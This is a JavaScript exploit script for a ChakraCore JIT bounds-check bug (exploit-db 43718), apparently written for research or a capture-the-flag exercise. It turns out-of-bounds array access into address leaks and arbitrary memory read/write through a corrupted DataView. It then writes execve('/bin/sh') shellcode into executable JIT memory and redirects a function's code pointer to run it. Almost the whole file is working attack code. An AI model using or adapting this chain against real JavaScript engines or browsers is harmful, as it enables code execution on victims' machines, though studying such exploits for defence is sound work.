// var convBuf = new ArrayBuffer(8);
// var f64 = new Float64Array(convBuf);
// var i32 = new Uint32Array(convBuf);

function hex(val, size = 8) {
    return '0x' + ('0'.repeat(size) + val.toString(16)).substr(-size);
}

const M = 0x100000000;
// function i2d(x) {
//     i32[0] = x % M;
//     i32[1] = x / M;
//     return f64[0];
// }
// function d2i(x) {
//     f64[0] = x;
//     return i32[1] * M + i32[0];
// }

function ReadUint64(view, offset) {
    const low = view.getUint32(offset, true);
    const high = view.getUint32(offset + 4, true);
    return high * 0x100000000 + low;
}

function WriteUint64(view, offset, val) {
    const low = val % M;
    const high = val / M;
    view.setUint32(offset, low, true);
    view.setUint32(offset + 4, high, true);
}


/*
https://www.exploit-db.com/exploits/43718/
What happens here is as follows:
In the loop prepass analysis, (a) is a valid add operation.
It's a relative operation to "i", so Chakra thinks it's a valid loop.

The variable "i" now becomes an induction variable, and a LoopCount object is created.
When the LoopCount object is created, the ValueInfo of "i" is IntBounded which contains
relative bounds information.
In the actual optimization phase, (a) gets optimized and becomes a load operation
which directly loads 10 to "i". It's no more relative operation, therefore the
ValueInfo of "i" is not to be IntBounded. But the LoopCount object has already been
created with the previous information. This leads Chakra to fail computing bounds
which may result in OOB read/write.
*/

/*
There is a type confusion in the JIT code emitter such that the bounds check on the
array indexing variable is not emitted. This is due to the relative addition in line
(a) below.

It can be exploited to OOB read/write as implemented below. The intended way to use this
it by first jitting the 2 functions, and then calling them with the 'target' OOB index as
the 'start' argument with 'end' = 'target' + 1.
*/

function oobWrite(arr, idx, val) {
    for (let i = idx; i < idx + 1; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        arr[i] = val;
    }
    return 0;
}

function oobRead(arr, idx) {
    let x;
    for (let i = idx; i < idx + 1; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        x = arr[i];
    }
    return x;
}

function oobCopy(arr, start, end, out) {
    for (let i = start; i < end; i++) {
        if (i === 10) {
            i += 0; // <-- (a)
        }
        out[i] = arr[i];
    }
}

// allocate SparseArraySegments of size such that they are adjacent
// see https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html
let sizeOfInt = 4;  // size of elements in JavascriptNativeIntArray
let sizeOfPtr = 8;  // size of elements in (mixed) JavascriptArray
let sizeOfNativeIntArray = (0x10000 - 0x38) / sizeOfInt;
let arrSpacing = 0x10000/sizeOfInt;
let ab = new ArrayBuffer(0x10000 - 0x38);

let oobArr = new Array(sizeOfNativeIntArray);
oobArr.fill(0x41414141);
oobArr[0] = 0x13371337;

let ptrArr = new Array((0x10000 - 0x38) / sizeOfPtr);
ptrArr.fill(ab);
ptrArr[0] = 0x43434343;
ptrArr[1] = oobArr;

// let dv = new DataView(ab);

// let gc = [];
// for(let i = 0; i < 100; i++) {
//     gc.push(new ArrayBuffer(0x20000));
// }
// gc = [];

// print("busy loop; wait for gc");
// const start = Date.now();
// while(Date.now() - start < 1000) {}
// print("done");

for (let i = 0; i < 1000; i++) {
    // oobWrite(arr, 0, 3, 5.40900888e-315);
    oobWrite(oobArr, 0, 0x13371337);
}
for (let i = 0; i < 1000; i++) {
    oobRead(oobArr, 0);
}

/* 
allocations:

oobArr @ 0x7ff7f2170000(+0x38)
ptrArr @ 0x7ff7f2180000(+0x38)
dataView ~ 0x7ff7f21c1500 <-- how consistent is this?
*/

// number of uint32s from start of oobArr to ptrArr's segment
let offToPtrArrSegment = sizeOfNativeIntArray;

function i32_u64(i32s) {
    return (i32s[1]>>>0)*M + (i32s[0]>>>0);
}

function readObjAddr(obj) {
    ptrArr[2] = obj;
    return [oobRead(oobArr, offToPtrArrSegment+18), oobRead(oobArr, offToPtrArrSegment+19)]
}


// read ptrArr[2], e.g. &ab;
// keep low and high as signed int32 because that is needed for oobRead and oobWrite
let abAddr = readObjAddr(ab);
// _low = oobRead(oobArr, offToPtrArrSegment + 32);
// let abAddr_high = oobRead(oobArr, offToPtrArrSegment + 33);
print('&ab: ' + hex(i32_u64(abAddr), 16));

let dvs = [];
for(let i = 0; i < 20; i++) {
    dvs.push(new DataView(ab));
}

// this offset seems consistent across runs, but not confirmed by source audit
let offToDataViewArea = sizeOfNativeIntArray + 2*arrSpacing;
// find index into oobArr to start of DataView object
let offDv = null;
for (let i = 0; i < arrSpacing; i += 2) {
    if (
        oobRead(oobArr, offToDataViewArea + i) === abAddr[0] &&
        oobRead(oobArr, offToDataViewArea + i + 1) === abAddr[1]
    ) {
        offDv = offToDataViewArea + i - 10;
        break;
    }
}

if(offDv === null) {
    print("No DV!");
    Math.floor(2.2);
}

print("dump dataView object:");
for (let i = 0; i < 16; i++) {
    print(i + ": " + hex(oobRead(oobArr, offDv + i) >>> 0));
}

/*
We control DataView object including backing buffer and buffer size!

Create another DataView, rw, that we point dv's backing buffer at.
This means that we can use dv to arbitrarily change rw's buffer,
archiving arbitrary rw.
*/

// tag and find dataview
oobWrite(oobArr, offDv + 8, 0x4141);
let dv = undefined;
for(let i = 0; i < dvs.length; i++) {
    if(dvs[i].byteLength === 0x4141) {
        dv = dvs[i];
        break
    }
}

print("&dv: " + hex(i32_u64(readObjAddr(dv)), 16));
let rw = new DataView(new ArrayBuffer(0x2000));
let rwAddr = readObjAddr(rw);
print("&rw: " + hex(i32_u64(rwAddr), 16));

// change backing buffer of DataView to rw!
oobWrite(oobArr, offDv + 14, rwAddr[0]);
oobWrite(oobArr, offDv + 15, rwAddr[1]); 

/* upgraded ReadUint64 and WriteUint64 */
function RWPrim(control, target) {
    this.control = control;
    this.target = target;
    this.obj = ab;
}
RWPrim.prototype.setAddr = function(addr) {
    this.control.setUint32(0x38, addr % M, true);
    this.control.setUint32(0x3c, addr / M, true);
};
RWPrim.prototype.readUint64 = function(addr) {
    this.setAddr(addr);
    return ReadUint64(this.target, 0);
}
RWPrim.prototype.writeUint64 = function(addr, val) {
    this.setAddr(addr);
    return WriteUint64(this.target, 0, val);
}
RWPrim.prototype.writeBytes = function(addr, xs) {
    this.setAddr(addr);
    for(let i = 0; i < xs.length; i++) {
        this.target.setUint8(i, xs[i]);
    }
}
RWPrim.prototype.getObjAddr = function(obj) {
    this.obj = obj;
    this.setAddr(this.self);
    return ReadUint64(this.target, 0x20);
}

let rwprim = new RWPrim(dv, rw);
rwprim.self = i32_u64(readObjAddr(rwprim));
print("rwPrim: " + hex(rwprim.self, 16));

let x1 = rwprim.getObjAddr(ab);
print("TEST getObjAddr: ab: " + hex(x1, 16));

let rwxHeap = rwprim.readUint64(x1+0x38);
print('rwxHeap: ' + hex(rwxHeap, 16));
let shellcode = rwxHeap + 0x100;
print('shellcode: ' + hex(shellcode, 16));

let cmd = "sh\0";
/* execve("/bin/sh", {"/bin/sh", "-c", cmd}, NULL) */
let code = [72, 184, 47, 98, 105, 110, 47, 115, 104, 0, 80, 84, 95, 104, 45, 
99, 0, 0, 84, 94, 49, 210, 82, 72, 141, 5, 11, 0, 0, 0, 80, 86, 
87, 72, 137, 230, 106, 59, 88, 15, 5];
for(let i = 0; i < cmd.length; i++) {
    code.push(cmd.charCodeAt(i));
}
rwprim.writeBytes(shellcode, code);

let funcAddr = rwprim.getObjAddr(oobRead);
print("funcObj: " + hex(funcAddr, 16));
let codeObj = rwprim.readUint64(funcAddr+0x8);
print("codeObj: " + hex(codeObj, 16));
print("codePage: " + hex(rwprim.readUint64(codeObj+0x18), 16));
rwprim.writeUint64(codeObj+0x18, shellcode);

// let entryPointObj = rwprim.readUint64(funcAddr);

// let funcObj = rwprim.getObjAddr(run_shellcode);
// print("funcObj: " + hex(funcObj, 16));

// let gc = [];
// for(let i = 0; i < 100; i++) {
//     gc.push(new ArrayBuffer(0x20000));
// }
// gc = [];

// print("busy loop; wait for gc");
// const start = Date.now();
// while(Date.now() - start < 1000) {}
// print("done");

oobRead(oobArr, 30005000);


// breakpoint: "b Js::Math::Floor(Js::RecyclableObject*, Js::CallInfo, ...)"
Math.floor(2.2);
